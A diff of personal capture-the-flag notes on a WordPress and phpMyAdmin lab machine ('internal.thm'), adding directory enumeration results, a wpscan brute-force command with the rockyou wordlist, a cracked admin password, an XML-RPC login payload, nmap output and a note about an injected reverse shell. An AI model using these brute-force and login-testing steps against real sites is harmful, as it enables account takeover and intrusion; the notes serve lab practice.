@@ -20,6 +20,24 @@
 	/blog/wp-includes => 301
 	/blog/xmlrpc.php => 301
 
+-Note:
+	other directories under phpmyadmin
+	/phpmyadmin/doc => 301
+	/phpmyadmin/favicon => 200
+	/phpmyadmin/index.php => 200
+	/phpmyadmin/js => 301
+	/phpmyadmin/libraries => 403
+	/phpmyadmin/locale => 301
+	/phpmyadmin/phpinfo.php => 200
+	/phpmyadmin/setup => 401
+	/phpmyadmin/sql => 301
+	/phpmyadmin/templates => 403
+	/phpmyadmin/themes => 301
+
+-Note:
+	other directories under wordpress
+
+
 Vulnerability point:
 	xmlrpc.php an exploit known specifically on wordpress apps and only accpets
 	POST requests. Run:
@@ -61,16 +79,52 @@ admin
 	Burp Suite intruder does not allow rockyou or any other super long wordlist
 	to be used in a bruteforce attack.
 	options:
-	wpscan
+	wpscan:
+		wpscan --url http://10.10.245.46/blog/ --passwords /usr/share/wordlists/rockyou.txt
 	hydra
 	
+Passwords:
+my2boys
+
+Payload:
+
+<methodCall>
+<methodName>wp.getUsersBlogs</methodName>
+<params>
+<param><value>admin</value></param>
+<param><value>my2boys</value></param>
+</params>
+</methodCall>
+
+-Note:
+	login via:
+		url/wordpress/wp-login
+
+How to get remote code execution?
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-29 21:00 EDT
+Nmap scan report for internal.thm (10.10.245.46)
+Host is up (0.097s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6efaefbef65f98b9597bf78eb9c5621e (RSA)
+|   256 ed64ed33e5c93058ba23040d14eb30e9 (ECDSA)
+|_  256 b07f7f7b5262622a60d43d36fa89eeff (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.92 seconds
 
 
 
 
-
-
-
+Note:
+	current status 10/29/23
+	injected reverse-shell script under themes
 
 
 
